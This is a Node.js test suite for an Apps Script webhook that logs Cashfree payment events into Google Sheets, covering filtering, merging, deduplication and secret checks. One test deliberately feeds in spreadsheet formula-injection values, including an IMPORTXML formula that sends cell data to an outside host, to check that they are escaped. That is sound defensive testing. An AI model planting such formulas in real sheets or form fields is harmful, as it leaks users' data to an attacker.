// Runs apps-script/Code.gs in a VM against fake Google services.
import { test, beforeEach } from 'node:test';
import assert from 'node:assert/strict';
import { readFileSync } from 'node:fs';
import vm from 'node:vm';

const code = readFileSync(new URL('../apps-script/Code.gs', import.meta.url), 'utf8');

const TAGS = { lead_id: 'L1', lp_name: 'home', utm_source: 'fb', utm_campaign: 'diwali' };
const LP_FORM = 'am-ads-yearly-basic-plan';
const ORDER = `CFPay_${LP_FORM}_ab12_1`;

const form = (formId = LP_FORM, orderId = ORDER) => ({
  data: {
    form: { form_id: formId, form_url: 'u', form_currency: 'INR' },
    order: {
      order_amount: 7999, order_id: orderId, order_status: 'PAID', transaction_id: 99,
      customer_details: { customer_phone: '9999999999', customer_email: 'a@b.co', customer_name: 'A B', customer_fields: [] },
      amount_details: [],
    },
  },
  event_time: 't',
  type: 'PAYMENT_FORM_ORDER_WEBHOOK',
});
const FORM = form();

const pg = (type, payment_status, order = {}) => ({
  data: {
    order: { order_id: ORDER, order_amount: 7999, order_currency: 'INR', order_tags: TAGS, ...order },
    payment: { cf_payment_id: 99, payment_status, payment_amount: 7999, payment_currency: 'INR', payment_group: 'upi',
      ...(payment_status === 'FAILED' && { error_details: { error_description: 'bank declined' } }) },
    customer_details: { customer_name: 'A B', customer_email: 'a@b.co', customer_phone: '9999999999' },
  },
  event_time: 't',
  type,
});

const sub = (type, subscriptionId) => ({
  data: { subscription_id: subscriptionId, payment_status: 'FAILED', payment_amount: 7999 },
  type,
});

function fakeSheet() {
  const rows = [];
  const range = (row, col, n = 1, m = 1) => ({
    createTextFinder: (text) => ({
      matchEntireCell: () => ({
        findNext: () => {
          const i = rows.slice(row - 1, row - 1 + n).findIndex((r) => r[col - 1] === text);
          return i === -1 ? null : { getRow: () => row + i };
        },
      }),
    }),
    getValues: () => rows.slice(row - 1, row - 1 + n).map((r) => r.slice(col - 1, col - 1 + m)),
    setValues: (vals) => vals.forEach((v, i) => {
      rows[row - 1 + i] = rows[row - 1 + i] || [];
      rows[row - 1 + i].splice(col - 1, m, ...v);
    }),
    clearContent: () => { rows.splice(row - 1, n); },
  });
  return {
    rows,
    appendRow: (r) => rows.push([...r]),
    setFrozenRows() {},
    getLastRow: () => rows.length,
    getRange: range,
    getDataRange: () => range(1, 1, rows.length, Math.max(...rows.map((r) => r.length))),
  };
}

let ctx, sheets, lockEvents;
beforeEach(() => {
  sheets = {};
  lockEvents = [];
  ctx = vm.createContext({
    LockService: { getScriptLock: () => ({ waitLock: () => lockEvents.push('wait'), releaseLock: () => lockEvents.push('release') }) },
    PropertiesService: { getScriptProperties: () => ({ getProperty: (k) => ({ SHARED_SECRET: 'shh' })[k] }) },
    SpreadsheetApp: {
      getActiveSpreadsheet: () => ({
        getSheetByName: (n) => sheets[n] || null,
        insertSheet: (n) => (sheets[n] = fakeSheet()),
      }),
    },
    ContentService: {
      MimeType: { JSON: 'json' },
      createTextOutput: (s) => ({ text: s, setMimeType() { return this; } }),
    },
    JSON, String, Date, Math,
  });
  vm.runInContext(code, ctx);
});

const post = (obj) => JSON.parse(ctx.doPost({ postData: { contents: JSON.stringify(obj) } }).text);
const hook = (payload = FORM, secret = 'shh') => post({ secret, raw: JSON.stringify(payload), received_at: 'now' });
const payments = () => {
  const [headers, ...rows] = sheets.Payments.rows;
  return rows.map((r) => Object.fromEntries(headers.map((h, i) => [h, r[i]])));
};

test('rejects a wrong secret and writes nothing', () => {
  assert.equal(hook(FORM, 'bad').ok, false);
  assert.deepEqual(Object.keys(sheets), []);
});

test('form webhook for a landing-page form: raw + parsed row, phone as text', () => {
  assert.deepEqual(hook(), { ok: true, stored: 'payment' });
  assert.equal(sheets.Payments_Raw.rows.length, 2); // header + 1
  const [p] = payments();
  assert.equal(p.order_id, ORDER);
  assert.equal(p.status, 'PAID');
  assert.equal(p.phone, "'9999999999");
  assert.equal(p.form_id, LP_FORM);
});

test('all three landing-page forms are kept', () => {
  for (const f of ['am-ads-yearly-basic-plan', 'am-yearly-basic-plan-ga', 'am-yearly-basic-plan-meta']) {
    assert.equal(hook(form(f, `CFPay_${f}_aa_1`)).stored, 'payment', f);
  }
  assert.equal(payments().length, 3);
});

test('other forms on the account are acknowledged but not stored anywhere', () => {
  assert.deepEqual(hook(form('anniversary-yearly-basic', 'CFPay_anniversary-yearly-basic_e3_1')), { ok: true, stored: 'ignored' });
  assert.deepEqual(Object.keys(sheets), []);
});

test('subscription events: ours go to raw only, others are ignored', () => {
  assert.equal(hook(sub('SUBSCRIPTION_PAYMENT_FAILED', `form_132583620_${LP_FORM}`)).stored, 'raw_only');
  assert.equal(hook(sub('SUBSCRIPTION_PAYMENT_SUCCESS', 'form_1_anniversary-monthly-basic')).stored, 'ignored');
  assert.equal(hook(sub('SUBSCRIPTION_PAYMENT_SUCCESS', 'sub_5c69869903c154f5')).stored, 'ignored');
  assert.equal(sheets.Payments_Raw.rows.length, 2);
  assert.equal(sheets.Payments, undefined);
});

test('form webhook with order_tags fills the tag columns', () => {
  const tagged = structuredClone(FORM);
  tagged.data.order.order_tags = TAGS;
  hook(tagged);
  const [p] = payments();
  assert.equal(p.lead_id, 'L1');
  assert.equal(p.lp_name, 'home');
  assert.equal(p.utm_source, 'fb');
  assert.equal(p.gclid, '');
});

test('same delivery twice -> one payment row, two raw rows', () => {
  hook();
  assert.equal(hook().stored, 'duplicate');
  assert.equal(payments().length, 1);
  assert.equal(sheets.Payments_Raw.rows.length, 3);
});

test('PG success after form PAID merges into one row and adds the tags', () => {
  hook();
  assert.equal(hook(pg('PAYMENT_SUCCESS_WEBHOOK', 'SUCCESS')).stored, 'merged');
  const rows = payments();
  assert.equal(rows.length, 1);
  assert.equal(rows[0].event_type, 'PAYMENT_FORM_ORDER_WEBHOOK'); // first writer kept
  assert.equal(rows[0].lead_id, 'L1');
  assert.equal(rows[0].payment_method, 'upi');
});

test('failed and dropped attempts are their own rows, with the error', () => {
  hook(pg('PAYMENT_FAILED_WEBHOOK', 'FAILED'));
  hook(pg('PAYMENT_USER_DROPPED_WEBHOOK', 'USER_DROPPED'));
  hook(pg('PAYMENT_SUCCESS_WEBHOOK', 'SUCCESS'));
  const rows = payments();
  assert.deepEqual(rows.map((r) => r.status), ['FAILED', 'USER_DROPPED', 'PAID']);
  assert.equal(rows[0].error, 'bank declined');
});

test('PG events: app/add-on orders and other forms are ignored', () => {
  const app = pg('PAYMENT_SUCCESS_WEBHOOK', 'SUCCESS', { order_id: 'order_123', order_tags: { addon_product_id: 'x', user_id: 'u' } });
  const otherForm = pg('PAYMENT_SUCCESS_WEBHOOK', 'SUCCESS', { order_id: 'CFPay_anniversary-yearly-basic_e3_1', order_tags: null });
  assert.equal(hook(app).stored, 'ignored');
  assert.equal(hook(otherForm).stored, 'ignored');
  assert.deepEqual(Object.keys(sheets), []);
});

test('PG event for a landing-page form order id without tags is kept', () => {
  assert.equal(hook(pg('PAYMENT_SUCCESS_WEBHOOK', 'SUCCESS', { order_tags: null })).stored, 'payment');
});

test('customer text that looks like a formula is stored as plain text', () => {
  const evil = structuredClone(FORM);
  evil.data.order.customer_details.customer_name = '=IMPORTXML("https://x.co/?"&A1,"//a")';
  evil.data.order.customer_details.customer_email = '+cmd@x.co';
  evil.data.order.customer_details.customer_phone = '+919999999999';
  evil.data.order.order_tags = { lead_id: '=HYPERLINK("x")' };
  hook(evil);
  const [p] = payments();
  assert.equal(p.name, '\'=IMPORTXML("https://x.co/?"&A1,"//a")');
  assert.equal(p.email, "'+cmd@x.co");
  assert.equal(p.phone, "'+919999999999");
  assert.equal(p.lead_id, '\'=HYPERLINK("x")');
});

test('Cashfree test pings and unknown types are ignored', () => {
  assert.equal(hook({ type: 'WEBHOOK', data: { test_object: { test_key: 'test_value' } } }).stored, 'ignored');
  assert.equal(hook({ type: 'PAYMENT_CHARGES_WEBHOOK', data: { order: { order_id: ORDER } } }).stored, 'ignored');
  assert.deepEqual(Object.keys(sheets), []);
});

test('malformed body returns ok:false and still releases the lock', () => {
  const r = JSON.parse(ctx.doPost({ postData: { contents: 'not json' } }).text);
  assert.equal(r.ok, false);
  assert.equal(lockEvents.at(-1), 'release');
});

test('removeOtherForms keeps only landing-page rows in both tabs, re-escaped', () => {
  // Rows as they look before filtering existed, read back the way getValues returns them.
  hook(); // ours
  const raw = sheets.Payments_Raw, pay = sheets.Payments;
  const otherForm = form('anniversary-yearly-basic', 'CFPay_anniversary-yearly-basic_e3_1');
  raw.appendRow(['now', 'k', otherForm.type, JSON.stringify(otherForm)]);
  raw.appendRow(['now', '', 'SUBSCRIPTION_PAYMENT_SUCCESS', JSON.stringify(sub('SUBSCRIPTION_PAYMENT_SUCCESS', 'form_1_anniversary-monthly-basic'))]);
  raw.appendRow(['now', '', 'SUBSCRIPTION_PAYMENT_FAILED', JSON.stringify(sub('SUBSCRIPTION_PAYMENT_FAILED', `form_2_${LP_FORM}`))]);
  const other = [...pay.rows[1]];
  other[3] = 'CFPay_anniversary-yearly-basic_e3_1';
  other[13] = 'anniversary-yearly-basic';
  pay.appendRow(other);
  // getValues hands back text without the escaping apostrophe.
  pay.rows[1][10] = '9999999999';
  pay.rows[1][8] = '=1+1';

  ctx.removeOtherForms();

  assert.deepEqual(raw.rows.slice(1).map((r) => r[2]), ['PAYMENT_FORM_ORDER_WEBHOOK', 'SUBSCRIPTION_PAYMENT_FAILED']);
  const rows = payments();
  assert.equal(rows.length, 1);
  assert.equal(rows[0].form_id, LP_FORM);
  assert.equal(rows[0].phone, "'9999999999");
  assert.equal(rows[0].name, "'=1+1");
});
